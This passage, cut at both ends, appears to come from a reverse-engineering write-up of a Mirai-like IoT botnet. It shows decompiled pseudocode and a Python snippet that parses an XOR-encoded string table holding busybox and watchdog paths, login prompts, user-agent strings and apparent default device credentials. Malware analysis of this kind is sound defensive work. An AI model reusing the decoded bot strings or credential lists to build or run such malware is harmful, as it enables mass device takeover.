= sub_8056AC4(0xAu);sub_8055CA0(v34, &amp;asc_8058C60[411], 10);dword_805A2D8 = (int)v34;word_805A2DC = 10;v35 = sub_8056AC4(5u);sub_8055CA0(v35, &amp;asc_8058C60[422], 5);dword_805A2E0 = (int)v35;word_805A2E4 = 5;v36 = sub_8056AC4(5u);sub_8055CA0(v36, &amp;asc_8058C60[428], 5);dword_805A2E8 = (int)v36;word_805A2EC = 5;v37 = sub_8056AC4(5u);sub_8055CA0(v37, &amp;asc_8058C60[434], 5);dword_805A2F0 = (int)v37;word_805A2F4 = 5;v38 = sub_8056AC4(6u);sub_8055CA0(v38, &amp;asc_8058C60[440], 6);dword_805A308 = (int)v38;word_805A30C = 6;v39 = sub_8056AC4(7u);sub_8055CA0(v39, &amp;asc_8058C60[447], 7);dword_805A310 = (int)v39;word_805A314 = 7;v40 = sub_8056AC4(7u);sub_8055CA0(v40, &amp;asc_8058C60[455], 7);dword_805A318 = (int)v40;word_805A31C = 7;v41 = sub_8056AC4(3u);sub_8055CA0(v41, &amp;asc_8058C60[463], 3);dword_805A320 = (int)v41;word_805A324 = 3;v42 = sub_8056AC4(0x12u);sub_8055CA0(v42, &amp;asc_8058C60[467], 18);dword_805A328 = (int)v42;word_805A32C = 18;v43 = sub_8056AC4(0x17u);sub_8055CA0(v43, &amp;asc_8058C60[486], 23);dword_805A330 = (int)v43;word_805A334 = 23;v44 = sub_8056AC4(9u);sub_8055CA0(v44, &amp;asc_8058C60[510], 9);dword_805A338 = (int)v44;word_805A33C = 9;v45 = sub_8056AC4(0x10u);sub_8055CA0(v45, &amp;asc_8058C60[520], 16);&quot;&quot;&quot;import relist1 = re.findall(&quot;asc_8058C60\\[([\\d]+)\\]&quot;, raw)list2 = re.findall(&quot;, (\\d+)\\);\\n&quot;, raw)list_tmp = [&quot;0&quot;]for _ in list1: list_tmp.append(_)list1 = list_tmpcipher1 = [0x07, 0x00, 0x00, 0x55, 0x4A, 0x4B, 0x56, 0x47, 0x4A, 0x43, 0x56, 0x0C, 0x41, 0x44, 0x22, 0x00, 0x07, 0xB7, 0x00, 0x4E, 0x58, 0x50, 0x46, 0x02, 0x41, 0x4D, 0x41, 0x49, 0x02, 0x44, 0x47, 0x51, 0x56, 0x22, 0x00, 0x0D, 0x52, 0x50, 0x4D, 0x41, 0x0D, 0x22, 0x00, 0x0D, 0x47, 0x5A, 0x47, 0x22, 0x00, 0x02, 0x0A, 0x46, 0x47, 0x4E, 0x47, 0x56, 0x47, 0x46, 0x0B, 0x22, 0x00, 0x0D, 0x44, 0x46, 0x22, 0x00, 0x0C, 0x43, 0x4C, 0x4B, 0x4F, 0x47, 0x22, 0x00, 0x0D, 0x51, 0x56, 0x43, 0x56, 0x57, 0x51, 0x22, 0x00, 0x46, 0x54, 0x50, 0x6A, 0x47, 0x4E, 0x52, 0x47, 0x50, 0x22, 0x00, 0x6C, 0x4B, 0x65, 0x65, 0x47, 0x70, 0x14, 0x1B, 0x5A, 0x46, 0x22, 0x00, 0x13, 0x11, 0x11, 0x15, 0x71, 0x4D, 0x50, 0x43, 0x6E, 0x6D, 0x63, 0x66, 0x67, 0x70, 0x22, 0x00, 0x6C, 0x4B, 0x65, 0x65, 0x47, 0x70, 0x46, 0x12, 0x4C, 0x49, 0x51, 0x13, 0x11, 0x11, 0x15, 0x22, 0x00, 0x7A, 0x13, 0x1B, 0x6B, 0x10, 0x11, 0x1B, 0x13, 0x10, 0x16, 0x77, 0x6B, 0x77, 0x22, 0x00, 0x6B, 0x57, 0x7B, 0x45, 0x57, 0x48, 0x47, 0x6B, 0x53, 0x4C, 0x22, 0x00, 0x13, 0x16, 0x64, 0x43, 0x22, 0x00, 0x41, 0x41, 0x63, 0x66, 0x22, 0x00, 0x0D, 0x52, 0x50, 0x4D, 0x41, 0x0D, 0x4C, 0x47, 0x56, 0x0D, 0x50, 0x4D, 0x57, 0x56, 0x47, 0x22, 0x00, 0x0D, 0x52, 0x50, 0x4D, 0x41, 0x0D, 0x41, 0x52, 0x57, 0x4B, 0x4C, 0x44, 0x4D, 0x22, 0x00, 0x60, 0x6D, 0x65, 0x6D, 0x6F, 0x6B, 0x72, 0x71, 0x22, 0x00, 0x0D, 0x47, 0x56, 0x41, 0x0D, 0x50, 0x41, 0x0C, 0x46, 0x0D, 0x50, 0x41, 0x0C, 0x4E, 0x4D, 0x41, 0x43, 0x4E, 0x22, 0x00, 0x45, 0x13, 0x43, 0x40, 0x41, 0x16, 0x46, 0x4F, 0x4D, 0x11, 0x17, 0x4A, 0x4C, 0x52, 0x10, 0x4E, 0x4B, 0x47, 0x12, 0x49, 0x48, 0x44, 0x22, 0x00, 0x0D, 0x46, 0x47, 0x54, 0x0D, 0x55, 0x43, 0x56, 0x41, 0x4A, 0x46, 0x4D, 0x45, 0x22, 0x00, 0x0D, 0x46, 0x47, 0x54, 0x0D, 0x4F, 0x4B, 0x51, 0x41, 0x0D, 0x55, 0x43, 0x56, 0x41, 0x4A, 0x46, 0x4D, 0x45, 0x22, 0x00, 0x0D, 0x46, 0x47, 0x54, 0x0D, 0x64, 0x76, 0x75, 0x66, 0x76, 0x13, 0x12, 0x13, 0x7D, 0x55, 0x43, 0x56, 0x41, 0x4A, 0x46, 0x4D, 0x45, 0x22, 0x00, 0x0D, 0x46, 0x47, 0x54, 0x0D, 0x4C, 0x47, 0x56, 0x51, 0x4E, 0x4B, 0x4C, 0x49, 0x0D, 0x22, 0x00, 0x72, 0x70, 0x6B, 0x74, 0x6F, 0x71, 0x65, 0x22, 0x00, 0x65, 0x67, 0x76, 0x6E, 0x6D, 0x61, 0x63, 0x6E, 0x6B, 0x72, 0x22, 0x00, 0x69, 0x6B, 0x6E, 0x6E, 0x63, 0x76, 0x76, 0x69, 0x22, 0x00, 0x67, 0x43, 0x56, 0x51, 0x1A, 0x22, 0x00, 0x54, 0x79, 0x12, 0x54, 0x22, 0x00, 0x1B, 0x11, 0x6D, 0x44, 0x48, 0x6A, 0x78, 0x10, 0x58, 0x22, 0x00, 0x65, 0x4A, 0x4D, 0x51, 0x56, 0x75, 0x57, 0x58, 0x6A, 0x47, 0x50, 0x47, 0x14, 0x14, 0x14, 0x22, 0x00, 0x75, 0x51, 0x65, 0x63, 0x16, 0x62, 0x64, 0x14, 0x64, 0x22, 0x00, 0x63, 0x61, 0x66, 0x60, 0x22, 0x00, 0x63, 0x40, 0x63, 0x46, 0x22, 0x00, 0x4B, 0x43, 0x65, 0x54, 0x22, 0x00, 0x51, 0x4A, 0x47, 0x4E, 0x4E, 0x22, 0x00, 0x47, 0x4C, 0x43, 0x40, 0x4E, 0x47, 0x22, 0x00, 0x51, 0x5B, 0x51, 0x56, 0x47, 0x4F, 0x22, 0x00, 0x51, 0x4A, 0x22, 0x00, 0x0D, 0x40, 0x4B, 0x4C, 0x0D, 0x40, 0x57, 0x51, 0x5B, 0x40, 0x4D, 0x5A, 0x02, 0x6E, 0x78, 0x70, 0x66, 0x22, 0x00, 0x6E, 0x78, 0x70, 0x66, 0x18, 0x02, 0x43, 0x52, 0x52, 0x4E, 0x47, 0x56, 0x02, 0x4C, 0x4D, 0x56, 0x02, 0x44, 0x4D, 0x57, 0x4C, 0x46, 0x22, 0x00, 0x4C, 0x41, 0x4D, 0x50, 0x50, 0x47, 0x41, 0x56, 0x22, 0x00, 0x0D, 0x40, 0x4B, 0x4C, 0x0D, 0x40, 0x57, 0x51, 0x5B, 0x40, 0x4D, 0x5A, 0x02, 0x52, 0x51, 0x22, 0x00, 0x0D, 0x40, 0x4B, 0x4C, 0x0D, 0x40, 0x57, 0x51, 0x5B, 0x40, 0x4D, 0x5A, 0x02, 0x49, 0x4B, 0x4E, 0x4E, 0x02, 0x0F, 0x1B, 0x02, 0x22, 0x00, 0x76, 0x71, 0x4D, 0x57, 0x50, 0x41, 0x47, 0x02, 0x67, 0x4C, 0x45, 0x4B, 0x4C, 0x47, 0x02, 0x73, 0x57, 0x47, 0x50, 0x5B, 0x22, 0x00, 0x0D, 0x47, 0x56, 0x41, 0x0D, 0x50, 0x47, 0x51, 0x4D, 0x4E, 0x54, 0x0C, 0x41, 0x4D, 0x4C, 0x44, 0x22, 0x00, 0x4C, 0x43, 0x4F, 0x47, 0x51, 0x47, 0x50, 0x54, 0x47, 0x50, 0x02, 0x22, 0x00, 0x61, 0x4D, 0x4C, 0x4C, 0x47, 0x41, 0x56, 0x4B, 0x4D, 0x4C, 0x18, 0x02, 0x49, 0x47, 0x47, 0x52, 0x0F, 0x43, 0x4E, 0x4B, 0x54, 0x47, 0x22, 0x00, 0x51, 0x47, 0x56, 0x61, 0x4D, 0x4D, 0x49, 0x4B, 0x47, 0x0A, 0x05, 0x22, 0x00, 0x50, 0x47, 0x44, 0x50, 0x47, 0x51, 0x4A, 0x18, 0x22, 0x00, 0x4E, 0x4D, 0x41, 0x43, 0x56, 0x4B, 0x4D, 0x4C, 0x18, 0x22, 0x00, 0x51, 0x47, 0x56, 0x0F, 0x41, 0x4D, 0x4D, 0x49, 0x4B, 0x47, 0x18, 0x22, 0x00, 0x41, 0x4D, 0x4C, 0x56, 0x47, 0x4C, 0x56, 0x0F, 0x4E, 0x47, 0x4C, 0x45, 0x56, 0x4A, 0x18, 0x22, 0x00, 0x56, 0x50, 0x43, 0x4C, 0x51, 0x44, 0x47, 0x50, 0x0F, 0x47, 0x4C, 0x41, 0x4D, 0x46, 0x4B, 0x4C, 0x45, 0x18, 0x22, 0x00, 0x41, 0x4A, 0x57, 0x4C, 0x49, 0x47, 0x46, 0x22, 0x00, 0x41, 0x4D, 0x4C, 0x4C, 0x47, 0x41, 0x56, 0x4B, 0x4D, 0x4C, 0x18, 0x22, 0x00, 0x51, 0x47, 0x50, 0x54, 0x47, 0x50, 0x18, 0x02, 0x46, 0x4D, 0x51, 0x43, 0x50, 0x50, 0x47, 0x51, 0x56, 0x22, 0x00, 0x51, 0x47, 0x50, 0x54, 0x47, 0x50, 0x18, 0x02, 0x41, 0x4E, 0x4D, 0x57, 0x46, 0x44, 0x4E, 0x43, 0x50, 0x47, 0x0F, 0x4C, 0x45, 0x4B, 0x4C, 0x5A, 0x22, 0x00, 0x43, 0x51, 0x51, 0x55, 0x4D, 0x50, 0x46, 0x22, 0x00, 0x4D, 0x45, 0x4B, 0x4C, 0x22, 0x00, 0x47, 0x4C, 0x56, 0x47, 0x50, 0x22, 0x00, 0x46, 0x49, 0x43, 0x4D, 0x55, 0x48, 0x44, 0x4B, 0x50, 0x4A, 0x4B, 0x43, 0x46, 0x13, 0x48, 0x11, 0x47, 0x46, 0x48, 0x49, 0x43, 0x4B, 0x22, 0x00, 0x00, 0x00, 0x63, 0x41, 0x41, 0x47, 0x52, 0x56, 0x18, 0x02, 0x56, 0x47, 0x5A, 0x56, 0x0D, 0x4A, 0x56, 0x4F, 0x4E, 0x0E, 0x43, 0x52, 0x52, 0x4E, 0x4B, 0x41, 0x43, 0x56, 0x4B, 0x4D, 0x4C, 0x0D, 0x5A, 0x4A, 0x56, 0x4F, 0x4E, 0x09, 0x5A, 0x4F, 0x4E, 0x0E, 0x43, 0x52, 0x52, 0x4E, 0x4B, 0x41, 0x43, 0x56, 0x4B, 0x4D, 0x4C, 0x0D, 0x5A, 0x4F, 0x4E, 0x19, 0x53, 0x1F, 0x12, 0x0C, 0x1B, 0x0E, 0x4B, 0x4F, 0x43, 0x45, 0x47, 0x0D, 0x55, 0x47, 0x40, 0x52, 0x0E, 0x08, 0x0D, 0x08, 0x19, 0x53, 0x1F, 0x12, 0x0C, 0x1A, 0x22, 0x00, 0x63, 0x41, 0x41, 0x47, 0x52, 0x56, 0x0F, 0x6E, 0x43, 0x4C, 0x45, 0x57, 0x43, 0x45, 0x47, 0x18, 0x02, 0x47, 0x4C, 0x0F, 0x77, 0x71, 0x0E, 0x47, 0x4C, 0x19, 0x53, 0x1F, 0x12, 0x0C, 0x1A, 0x22, 0x00, 0x00, 0x00, 0x00, 0x61, 0x4D, 0x4C, 0x56, 0x47, 0x4C, 0x56, 0x0F, 0x76, 0x5B, 0x52, 0x47, 0x18, 0x02, 0x43, 0x52, 0x52, 0x4E, 0x4B, 0x41, 0x43, 0x56, 0x4B, 0x4D, 0x4C, 0x0D, 0x5A, 0x0F, 0x55, 0x55, 0x55, 0x0F, 0x44, 0x4D, 0x50, 0x4F, 0x0F, 0x57, 0x50, 0x4E, 0x47, 0x4C, 0x41, 0x4D, 0x46, 0x47, 0x46, 0x22, 0x00, 0x00, 0x00, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x17, 0x0C, 0x12, 0x02, 0x0A, 0x75, 0x4B, 0x4C, 0x46, 0x4D, 0x55, 0x51, 0x02, 0x6C, 0x76, 0x02, 0x13, 0x12, 0x0C, 0x12, 0x19, 0x02, 0x75, 0x6D, 0x75, 0x14, 0x16, 0x0B, 0x02, 0x63, 0x52, 0x52, 0x4E, 0x47, 0x75, 0x47, 0x40, 0x69, 0x4B, 0x56, 0x0D, 0x17, 0x11, 0x15, 0x0C, 0x11, 0x14, 0x02, 0x0A, 0x69, 0x6A, 0x76, 0x6F, 0x6E, 0x0E, 0x02, 0x4E, 0x4B, 0x49, 0x47, 0x02, 0x65, 0x47, 0x41, 0x49, 0x4D, 0x0B, 0x02, 0x61, 0x4A, 0x50, 0x4D, 0x4F, 0x47, 0x0D, 0x17, 0x13, 0x0C, 0x12, 0x0C, 0x10, 0x15, 0x12, 0x16, 0x0C, 0x13, 0x12, 0x11, 0x02, 0x71, 0x43, 0x44, 0x43, 0x50, 0x4B, 0x0D, 0x17, 0x11, 0x15, 0x0C, 0x11, 0x14, 0x22, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x17, 0x0C, 0x12, 0x02, 0x0A, 0x75, 0x4B, 0x4C, 0x46, 0x4D, 0x55, 0x51, 0x02, 0x6C, 0x76, 0x02, 0x13, 0x12, 0x0C, 0x12, 0x19, 0x02, 0x75, 0x6D, 0x75, 0x14, 0x16, 0x0B, 0x02, 0x63, 0x52, 0x52, 0x4E, 0x47, 0x75, 0x47, 0x40, 0x69, 0x4B, 0x56, 0x0D, 0x17, 0x11, 0x15, 0x0C, 0x11, 0x14, 0x02, 0x0A, 0x69, 0x6A, 0x76, 0x6F, 0x6E, 0x0E, 0x02, 0x4E, 0x4B, 0x49, 0x47, 0x02, 0x65, 0x47, 0x41, 0x49, 0x4D, 0x0B, 0x02, 0x61, 0x4A, 0x50, 0x4D, 0x4F, 0x47, 0x0D, 0x17, 0x10, 0x0C, 0x12, 0x0C, 0x10, 0x15, 0x16, 0x11, 0x0C, 0x13, 0x13, 0x14, 0x02, 0x71, 0x43, 0x44, 0x43, 0x50, 0x4B, 0x0D, 0x17, 0x11, 0x15, 0x0C, 0x11, 0x14, 0x22, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x17, 0x0C, 0x12, 0x02, 0x0A, 0x75, 0x4B, 0x4C, 0x46, 0x4D, 0x55, 0x51, 0x02, 0x6C, 0x76, 0x02, 0x14, 0x0C, 0x13, 0x19, 0x02, 0x75, 0x6D, 0x75, 0x14, 0x16, 0x0B, 0x02, 0x63, 0x52, 0x52, 0x4E, 0x47, 0x75, 0x47, 0x40, 0x69, 0x4B, 0x56, 0x0D, 0x17, 0x11, 0x15, 0x0C, 0x11, 0x14, 0x02, 0x0A, 0x69, 0x6A, 0x76, 0x6F, 0x6E, 0x0E, 0x02, 0x4E, 0x4B, 0x49, 0x47, 0x02, 0x65, 0x47, 0x41, 0x49, 0x4D, 0x0B, 0x02, 0x61, 0x4A, 0x50, 0x4D, 0x4F, 0x47, 0x0D, 0x17, 0x13, 0x0C, 0x12, 0x0C, 0x10, 0x15, 0x12, 0x16, 0x0C, 0x13, 0x12, 0x11, 0x02, 0x71, 0x43, 0x44, 0x43, 0x50, 0x4B, 0x0D, 0x17, 0x11, 0x15, 0x0C, 0x11, 0x14, 0x22, 0x00, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x17, 0x0C, 0x12, 0x02, 0x0A, 0x75, 0x4B, 0x4C, 0x46, 0x4D, 0x55, 0x51, 0x02, 0x6C, 0x76, 0x02, 0x14, 0x0C, 0x13, 0x19, 0x02, 0x75, 0x6D, 0x75, 0x14, 0x16, 0x0B, 0x02, 0x63, 0x52, 0x52, 0x4E, 0x47, 0x75, 0x47, 0x40, 0x69, 0x4B, 0x56, 0x0D, 0x17, 0x11, 0x15, 0x0C, 0x11, 0x14, 0x02, 0x0A, 0x69, 0x6A, 0x76, 0x6F, 0x6E, 0x0E, 0x02, 0x4E, 0x4B, 0x49, 0x47, 0x02, 0x65, 0x47, 0x41, 0x49, 0x4D, 0x0B, 0x02, 0x61, 0x4A, 0x50, 0x4D, 0x4F, 0x47, 0x0D, 0x17, 0x10, 0x0C, 0x12, 0x0C, 0x10, 0x15, 0x16, 0x11, 0x0C, 0x13, 0x13, 0x14, 0x02, 0x71, 0x43, 0x44, 0x43, 0x50, 0x4B, 0x0D, 0x17, 0x11, 0x15, 0x0C, 0x11, 0x14, 0x22, 0x00, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x17, 0x0C, 0x12, 0x02, 0x0A, 0x6F, 0x43, 0x41, 0x4B, 0x4C, 0x56, 0x4D, 0x51, 0x4A, 0x19, 0x02, 0x6B, 0x4C, 0x56, 0x47, 0x4E, 0x02, 0x6F, 0x43, 0x41, 0x02, 0x6D, 0x71, 0x02, 0x7A, 0x02, 0x13, 0x12, 0x7D, 0x13, 0x13, 0x7D, 0x14, 0x0B, 0x02, 0x63, 0x52, 0x52, 0x4E, 0x47, 0x75, 0x47, 0x40, 0x69, 0x4B, 0x56, 0x0D, 0x14, 0x12, 0x13, 0x0C, 0x15, 0x0C, 0x15, 0x02, 0x0A, 0x69, 0x6A, 0x76, 0x6F, 0x6E, 0x0E, 0x02, 0x4E, 0x4B, 0x49, 0x47, 0x02, 0x65, 0x47, 0x41, 0x49, 0x4D, 0x0B, 0x02, 0x74, 0x47, 0x50, 0x51, 0x4B, 0x4D, 0x4C, 0x0D, 0x1B, 0x0C, 0x13, 0x0C, 0x10, 0x02, 0x71, 0x43, 0x44, 0x43, 0x50, 0x4B, 0x0D, 0x14, 0x12, 0x13, 0x0C, 0x15, 0x0C, 0x15, 0x22, 0x00, 0x00, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x16, 0x0C, 0x12, 0x02, 0x0A, 0x41, 0x4D, 0x4F, 0x52, 0x43, 0x56, 0x4B, 0x40, 0x4E, 0x47, 0x19, 0x02, 0x6F, 0x71, 0x6B, 0x67, 0x02, 0x1B, 0x0C, 0x12, 0x19, 0x02, 0x75, 0x4B, 0x4C, 0x46, 0x4D, 0x55, 0x51, 0x02, 0x6C, 0x76, 0x02, 0x17, 0x0C, 0x13, 0x19, 0x02, 0x76, 0x50, 0x4B, 0x46, 0x47, 0x4C, 0x56, 0x0D, 0x17, 0x0C, 0x12, 0x0B, 0x22, 0x00, 0x00, 0x00, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x16, 0x0C, 0x12, 0x02, 0x0A, 0x41, 0x4D, 0x4F, 0x52, 0x43, 0x56, 0x4B, 0x40, 0x4E, 0x47, 0x19, 0x02, 0x6F, 0x71, 0x6B, 0x67, 0x02, 0x1B, 0x0C, 0x12, 0x19, 0x02, 0x75, 0x4B, 0x4C, 0x46, 0x4D, 0x55, 0x51, 0x02, 0x6C, 0x76, 0x02, 0x14, 0x0C, 0x12, 0x19, 0x02, 0x76, 0x50, 0x4B, 0x46, 0x47, 0x4C, 0x56, 0x0D, 0x16, 0x0C, 0x12, 0x19, 0x02, 0x65, 0x76, 0x60, 0x15, 0x0C, 0x16, 0x19, 0x02, 0x6B, 0x4C, 0x44, 0x4D, 0x72, 0x43, 0x56, 0x4A, 0x0C, 0x11, 0x19, 0x02, 0x71, 0x74, 0x13, 0x19, 0x02, 0x0C, 0x6C, 0x67, 0x76, 0x02, 0x61, 0x6E, 0x70, 0x02, 0x11, 0x0C, 0x16, 0x0C, 0x17, 0x11, 0x11, 0x14, 0x12, 0x19, 0x02, 0x75, 0x6D, 0x75, 0x14, 0x16, 0x19, 0x02, 0x47, 0x4C, 0x0F, 0x77, 0x71, 0x0B, 0x22, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x16, 0x0C, 0x12, 0x02, 0x0A, 0x41, 0x4D, 0x4F, 0x52, 0x43, 0x56, 0x4B, 0x40, 0x4E, 0x47, 0x19, 0x02, 0x6F, 0x71, 0x6B, 0x67, 0x02, 0x1B, 0x0C, 0x12, 0x19, 0x02, 0x75, 0x4B, 0x4C, 0x46, 0x4D, 0x55, 0x51, 0x02, 0x6C, 0x76, 0x02, 0x14, 0x0C, 0x13, 0x19, 0x02, 0x76, 0x50, 0x4B, 0x46, 0x47, 0x4C, 0x56, 0x0D, 0x16, 0x0C, 0x12, 0x19, 0x02, 0x64, 0x66, 0x6F, 0x19, 0x02, 0x6F, 0x71, 0x6B, 0x67, 0x61, 0x50, 0x43, 0x55, 0x4E, 0x47, 0x50, 0x19, 0x02, 0x6F, 0x47, 0x46, 0x4B, 0x43, 0x02, 0x61, 0x47, 0x4C, 0x56, 0x47, 0x50, 0x02, 0x72, 0x61, 0x02, 0x17, 0x0C, 0x12, 0x0B, 0x22, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x16, 0x0C, 0x12, 0x02, 0x0A, 0x41, 0x4D, 0x4F, 0x52, 0x43, 0x56, 0x4B, 0x40, 0x4E, 0x47, 0x19, 0x02, 0x6F, 0x71, 0x6B, 0x67, 0x02, 0x1B, 0x0C, 0x12, 0x19, 0x02, 0x75, 0x4B, 0x4C, 0x46, 0x4D, 0x55, 0x51, 0x02, 0x6C, 0x76, 0x02, 0x14, 0x0C, 0x13, 0x19, 0x02, 0x76, 0x50, 0x4B, 0x46, 0x47, 0x4C, 0x56, 0x0D, 0x16, 0x0C, 0x12, 0x19, 0x02, 0x65, 0x76, 0x60, 0x15, 0x0C, 0x16, 0x19, 0x02, 0x6B, 0x4C, 0x44, 0x4D, 0x72, 0x43, 0x56, 0x4A, 0x0C, 0x10, 0x19, 0x02, 0x71, 0x74, 0x13, 0x19, 0x02, 0x0C, 0x6C, 0x67, 0x76, 0x02, 0x61, 0x6E, 0x70, 0x02, 0x16, 0x0C, 0x16, 0x0C, 0x17, 0x1A, 0x15, 0x1B, 0x1B, 0x19, 0x02, 0x75, 0x6D, 0x75, 0x14, 0x16, 0x19, 0x02, 0x47, 0x4C, 0x0F, 0x77, 0x71, 0x0B, 0x22, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x16, 0x0C, 0x12, 0x02, 0x0A, 0x41, 0x4D, 0x4F, 0x52, 0x43, 0x56, 0x4B, 0x40, 0x4E, 0x47, 0x19, 0x02, 0x6F, 0x71, 0x6B, 0x67, 0x02, 0x1B, 0x0C, 0x12, 0x19, 0x02, 0x75, 0x4B, 0x4C, 0x46, 0x4D, 0x55, 0x51, 0x02, 0x6C, 0x76, 0x02, 0x14, 0x0C, 0x13, 0x19, 0x02, 0x76, 0x50, 0x4B, 0x46, 0x47, 0x4C, 0x56, 0x0D, 0x17, 0x0C, 0x12, 0x19, 0x02, 0x64, 0x57, 0x4C, 0x75, 0x47, 0x40, 0x72, 0x50, 0x4D, 0x46, 0x57, 0x41, 0x56, 0x51, 0x0B, 0x22, 0x00, 0x00, 0x00, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x17, 0x0C, 0x12, 0x02, 0x0A, 0x6F, 0x43, 0x41, 0x4B, 0x4C, 0x56, 0x4D, 0x51, 0x4A, 0x19, 0x02, 0x6B, 0x4C, 0x56, 0x47, 0x4E, 0x02, 0x6F, 0x43, 0x41, 0x02, 0x6D, 0x71, 0x02, 0x7A, 0x02, 0x13, 0x12, 0x0C, 0x14, 0x19, 0x02, 0x50, 0x54, 0x18, 0x10, 0x17, 0x0C, 0x12, 0x0B, 0x02, 0x65, 0x47, 0x41, 0x49, 0x4D, 0x0D, 0x10, 0x12, 0x13, 0x12, 0x12, 0x13, 0x12, 0x13, 0x02, 0x64, 0x4B, 0x50, 0x47, 0x44, 0x4D, 0x5A, 0x0D, 0x10, 0x17, 0x0C, 0x12, 0x22, 0x00, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x17, 0x0C, 0x12, 0x02, 0x0A, 0x6F, 0x43, 0x41, 0x4B, 0x4C, 0x56, 0x4D, 0x51, 0x4A, 0x19, 0x02, 0x6B, 0x4C, 0x56, 0x47, 0x4E, 0x02, 0x6F, 0x43, 0x41, 0x02, 0x6D, 0x71, 0x02, 0x7A, 0x02, 0x13, 0x12, 0x0C, 0x1A, 0x19, 0x02, 0x50, 0x54, 0x18, 0x10, 0x13, 0x0C, 0x12, 0x0B, 0x02, 0x65, 0x47, 0x41, 0x49, 0x4D, 0x0D, 0x10, 0x12, 0x13, 0x12, 0x12, 0x13, 0x12, 0x13, 0x02, 0x64, 0x4B, 0x50, 0x47, 0x44, 0x4D, 0x5A, 0x0D, 0x10, 0x13, 0x0C, 0x12, 0x22, 0x00, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x17, 0x0C, 0x12, 0x02, 0x0A, 0x6F, 0x43, 0x41, 0x4B, 0x4C, 0x56, 0x4D, 0x51, 0x4A, 0x19, 0x02, 0x6B, 0x4C, 0x56, 0x47, 0x4E, 0x02, 0x6F, 0x43, 0x41, 0x02, 0x6D, 0x71, 0x02, 0x7A, 0x02, 0x13, 0x12, 0x0C, 0x1A, 0x19, 0x02, 0x50, 0x54, 0x18, 0x10, 0x16, 0x0C, 0x12, 0x0B, 0x02, 0x65, 0x47, 0x41, 0x49, 0x4D, 0x0D, 0x10, 0x12, 0x13, 0x12, 0x12, 0x13, 0x12, 0x13, 0x02, 0x64, 0x4B, 0x50, 0x47, 0x44, 0x4D, 0x5A, 0x0D, 0x10, 0x16, 0x0C, 0x12, 0x22, 0x00, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x17, 0x0C, 0x12, 0x02, 0x0A, 0x6F, 0x43, 0x41, 0x4B, 0x4C, 0x56, 0x4D, 0x51, 0x4A, 0x19, 0x02, 0x6B, 0x4C, 0x56, 0x47, 0x4E, 0x02, 0x6F, 0x43, 0x41, 0x02, 0x6D, 0x71, 0x02, 0x7A, 0x02, 0x13, 0x12, 0x7D, 0x13, 0x12, 0x19, 0x02, 0x50, 0x54, 0x18, 0x11, 0x11, 0x0C, 0x12, 0x0B, 0x02, 0x65, 0x47, 0x41, 0x49, 0x4D, 0x0D, 0x10, 0x12, 0x13, 0x12, 0x12, 0x13, 0x12, 0x13, 0x02, 0x64, 0x4B, 0x50, 0x47, 0x44, 0x4D, 0x5A, 0x0D, 0x11, 0x11, 0x0C, 0x12, 0x22, 0x00, 0x6F, 0x4D, 0x58, 0x4B, 0x4E, 0x4E, 0x43, 0x0D, 0x17, 0x0C, 0x12, 0x02, 0x0A, 0x75, 0x4B, 0x4C, 0x46, 0x4D, 0x55, 0x51, 0x02, 0x6C, 0x76, 0x02, 0x13, 0x12, 0x0C, 0x12, 0x19, 0x02, 0x75, 0x4B, 0x4C, 0x14, 0x16, 0x19, 0x02, 0x5A, 0x14, 0x16, 0x0B, 0x02, 0x63, 0x52, 0x52, 0x4E, 0x47, 0x75, 0x47, 0x40, 0x69, 0x4B, 0x56, 0x0D, 0x17, 0x11, 0x15, 0x0C, 0x11, 0x14, 0x02, 0x0A, 0x69, 0x6A, 0x76, 0x6F, 0x6E, 0x0E, 0x02, 0x4E, 0x4B, 0x49, 0x47, 0x02, 0x65, 0x47, 0x41, 0x49, 0x4D, 0x0B, 0x02, 0x61, 0x4A, 0x50, 0x4D, 0x4F, 0x47, 0x0D, 0x14, 0x10, 0x0C, 0x12, 0x0C, 0x11, 0x10, 0x12, 0x10, 0x0C, 0x1B, 0x16, 0x22, 0x00, 0x00, 0x00]#lsit1 = [&#x27;0&#x27;, &#x27;3&#x27;, &#x27;16&#x27;, &#x27;19&#x27;, &#x27;35&#x27;, &#x27;43&#x27;, &#x27;49&#x27;, &#x27;61&#x27;, &#x27;66&#x27;, &#x27;74&#x27;, &#x27;83&#x27;, &#x27;94&#x27;, &#x27;106&#x27;, &#x27;122&#x27;, &#x27;139&#x27;, &#x27;154&#x27;, &#x27;166&#x27;, &#x27;172&#x27;, &#x27;178&#x27;, &#x27;195&#x27;, &#x27;210&#x27;, &#x27;220&#x27;, &#x27;240&#x27;, &#x27;264&#x27;, &#x27;279&#x27;, &#x27;299&#x27;, &#x27;323&#x27;, &#x27;339&#x27;, &#x27;348&#x27;, &#x27;360&#x27;, &#x27;370&#x27;, &#x27;377&#x27;, &#x27;383&#x27;, &#x27;394&#x27;, &#x27;411&#x27;, &#x27;422&#x27;, &#x27;428&#x27;, &#x27;434&#x27;, &#x27;440&#x27;, &#x27;447&#x27;, &#x27;455&#x27;, &#x27;463&#x27;, &#x27;467&#x27;, &#x27;486&#x27;, &#x27;510&#x27;, &#x27;520&#x27;]#list2 = [&#x27;2&#x27;, &#x27;12&#x27;, &#x27;2&#x27;, 